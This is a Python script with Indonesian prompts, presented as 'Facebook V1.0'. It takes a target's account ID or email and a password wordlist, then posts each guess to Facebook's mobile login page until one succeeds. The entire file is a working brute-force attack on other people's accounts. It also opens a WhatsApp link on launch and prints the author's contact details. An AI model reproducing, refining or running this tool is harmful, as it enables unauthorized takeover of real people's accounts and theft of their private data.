#!/usr/bin/python2

import requests
import time
import os
import sys

sleep = time.sleep
system = os.system
exit = sys.exit

def main():
    sleep(2)
    system("clear")
    system("xdg-open https://wa.me/6289652884613/?text=Aku%20mau%20kok%20Jadi%20Pacar%20Kamu%20:v")
    sleep(2)
    system("clear")
    sleep(2)
    namaku = input("\033[1;33m[\033[1;37m?\033[1;33m] Tuliskan Namamu : \033[1;37m")
    sleep(2)
    system("clear")
    sleep(2)
    print ("""
                                                           
     \033[1;31m/**/////                             /**             ****** 
    \033[1;31m/**        ******    *****   *****  ******  ******  /**///**
    \033[1;31m/*******  //////**  **///** **///**///**/  //////** /**  /**
    \033[1;31m/**////    ******* /**  // /*******  /**    ******* /****** 
    \033[1;37m/**       **////** /**   **/**////   /**   **////** /**///  
    \033[1;37m/**      //********//***** //******  //** //********/**     
    \033[1;37m//        ////////  /////   //////    //   //////// //  V1.0

     \033[1;33mAuthor > \033[1;37mD@rk_Devil#666
       \033[1;33mWA   > \033[1;37m089652884613
      \033[1;33mEmail > \033[1;37mDarkhytd666@gmail.com
     \033[1;32mCopyright © 2019 \033[1;37mFarrel
    """)
    sleep(0.3)
    print ("")
    print ("\033[1;33m[\033[1;37m√\033[1;33m] \033[1;33mSelamat Datang \033[1;37m%s" % namaku)
    sleep(0.3)
    print ("\033[1;33m[\033[1;37m!\033[1;33m] CTRL + C Memberhentikan Proggram")
    sleep(0.3)
    print ("")
    url = 'https://free.facebook.com/login.php'
    email = input("\033[1;33m[\033[1;37m?\033[1;33m] \033[1;32mMasukkan |ID| |Email| |No| : \033[1;37m")
    pw = input("\033[1;33m[\033[1;37m?\033[1;33m] \033[1;32mPassword LIST : \033[1;37m")
    
    x = open(pw, "r").readlines()
    
    for line in x:
        password = line.strip()
        
        http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
        content = http.content
        if "Beranda" in str(content):
            print ("\033[1;33m[\033[1;37m√\033[1;33m] \033[1;33mPassword ditemukan >> \033[1;37m%s" % password)
            exit(1)
            
        else:
            print ("\033[1;33m[\033[1;37m!\033[1;33m] \033[1;33mGagal >> \033[1;31m%s" % password)
            
if __name__ == "__main__":
    main()
